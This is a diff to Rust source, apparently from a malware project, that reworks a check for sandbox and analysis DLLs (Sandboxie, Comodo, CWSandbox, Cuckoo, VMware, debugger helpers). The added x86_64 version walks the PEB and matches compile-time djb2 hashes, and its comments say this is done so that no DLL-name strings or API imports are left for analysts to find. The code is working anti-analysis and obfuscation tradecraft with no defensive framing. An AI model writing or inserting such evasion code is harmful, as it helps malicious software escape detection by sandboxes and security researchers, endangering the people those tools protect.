@@ -93,27 +93,35 @@ unsafe fn running_as_system() -> bool {
 }
 
 /// Returns true if any known sandbox/analysis DLL is loaded into the current process.
-/// SbieDll.dll = Sandboxie; cmdvrt32.dll = Comodo; api_log.dll / dir_watch.dll = CWSandbox;
-/// pstorec.dll = old Cuckoo stub; dbghelp.dll variants are common debugger helpers.
-#[cfg(target_os = "windows")]
+/// Uses PEB walk (no GetModuleHandleA) to check without leaving API call strings in IAT.
+#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+unsafe fn analysis_dll_present() -> bool {
+    use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base};
+    // Compile-time hashes; no plaintext DLL names at runtime.
+    const HASHES: &[u32] = &[
+        djb2_hash_lower(b"sbiedll.dll"),    // Sandboxie
+        djb2_hash_lower(b"cmdvrt32.dll"),   // Comodo sandbox
+        djb2_hash_lower(b"api_log.dll"),    // CWSandbox
+        djb2_hash_lower(b"dir_watch.dll"),  // CWSandbox
+        djb2_hash_lower(b"pstorec.dll"),    // Cuckoo stub
+        djb2_hash_lower(b"wpespy.dll"),     // WPE Pro packet logger
+        djb2_hash_lower(b"vmcheck.dll"),    // VMware check lib
+        djb2_hash_lower(b"dbghlp.dll"),     // Debugger helper variant
+    ];
+    for &h in HASHES {
+        if !peb_get_module_base(h).is_null() { return true; }
+    }
+    false
+}
+
+#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
 unsafe fn analysis_dll_present() -> bool {
     use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
     const DLLS: &[&[u8]] = &[
-        b"SbieDll.dll\0",
-        b"cmdvrt32.dll\0",
-        b"api_log.dll\0",
-        b"dir_watch.dll\0",
-        b"pstorec.dll\0",
-        b"wpespy.dll\0",
-        b"vmcheck.dll\0",
-        b"dbghlp.dll\0",
+        b"SbieDll.dll\0", b"cmdvrt32.dll\0", b"api_log.dll\0", b"dir_watch.dll\0",
+        b"pstorec.dll\0",  b"wpespy.dll\0",   b"vmcheck.dll\0", b"dbghlp.dll\0",
     ];
-    for &dll in DLLS {
-        if GetModuleHandleA(dll.as_ptr()) != 0 {
-            return true;
-        }
-    }
-    false
+    DLLS.iter().any(|&dll| GetModuleHandleA(dll.as_ptr()) != 0)
 }
 
 #[cfg(all(target_arch = "x86_64", target_os = "windows"))]
